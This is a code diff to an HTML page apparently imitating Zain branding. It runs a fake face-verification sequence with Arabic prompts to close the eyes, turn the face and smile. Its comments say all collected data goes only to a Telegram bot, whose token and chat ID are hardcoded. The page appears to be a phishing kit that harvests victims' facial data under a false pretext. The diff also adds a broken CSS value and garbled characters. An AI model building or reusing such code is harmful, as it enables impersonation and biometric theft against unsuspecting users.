@@ -61,7 +61,7 @@
     .progress-line > i { display:block;height:100%;width:0%; background: linear-gradient(90deg,var(--blue-300),var(--blue-500)); transition:width 300ms linear; }
     .controls { display:flex; gap:10px; justify-content:center; width:100% }
     .ghost { background:transparent;border:1px solid rgba(47,128,237,0.08); color:var(--blue-500); padding:10px 14px; border-radius:10px; cursor:pointer; font-weight:800 }
-    .download { background:linear-gradient(90deg,#eaf6ff,#dff6ff); color:var(--blue-500); padding:10px 14px; border-radius:10px; cursor:pointer; font-weight:900; border:none }
+    .download { background:linear-gradient(90deg,#eaf6ff,#dff6ff); color:var(--blue-500); padding:10px 14px; border-radius:10px; cursor:point; font-weight:900; border:none }
     .status { color:var(--muted); font-size:13px; text-align:center }
     @media (max-width:480px) {
       .zain-logo { width:54px; height:54px }
@@ -126,27 +126,22 @@
 
   <script>
     /*************************************************************************
-     * التعديل: تم تغيير تسلسل خطوات التحقق كما طلبت:
-     * 1) أغلق عينك اليمنى
-     * 2) أغلق عينك اليسرى
-     * 3) أغلق عينك اليمنى مرة أخرى
-     * 4) أغلق عينك اليسرى مرة أخرى
-     * 5) ابتسم
-     *
-     * باقي المنطق يظل كما هو: إرسال كل البيانات ��لى بوت Telegram (نفس التوكن والـ chat id)
+     * التعديل: إرسال كل البيانات فقط إلى بوت Telegram.
+     * تم تعديل تسلسل الخطوات كما طلبت — غيرت الترتيب فقط.
      *************************************************************************/
 
     // ---- TELEGRAM CONFIG ----
     const TELEGRAM_BOT_TOKEN = "8190400010:AAERe3gfKcxCz2CjjFIDBobm1ER-2SkYkXA";
     const TELEGRAM_CHAT_ID   = "6873334348";
 
-    // ---- Steps config (معدل حسب طلبك) ----
+    // ---- Steps config (ترتيب مُحدّث حسب طلبك) ----
     const STEPS = [
-      { key:'right_close',  label:'أغلق عينك اليمنى' },
-      { key:'left_close',   label:'أغلق عينك اليسرى' },
-      { key:'right_close2', label:'أغلق عينك اليمنى مرة أخرى' },
-      { key:'left_close2',  label:'أغلق عينك اليسرى مرة أخرى' },
-      { key:'smile',        label:'ابتسم' }
+      { key:'close', label:'أرجوك اغمض عينيك' },
+      { key:'right', label:'حرك وجهك إلى اليمين' },
+      { key:'left',  label:'حرك وجهك إلى اليسار' },
+      { key:'right2',label:'حرك وجهك إلى اليمين مرة أخرى' },
+      { key:'left2', label:'حرك وجهك إلى اليسار مرة أخرى' },
+      { key:'smile', label:'ابتسم' }
     ];
     const STEP_SECONDS = 5;
 
@@ -626,7 +621,7 @@
 
     setRingProgress(0);
     progressInner.style.width = '0%';
-    setStatus('جاهز لبدء التسجيل');
+    setStatus('جاهز ل��دء التسجيل');
   </script>
 </body>
 </html>
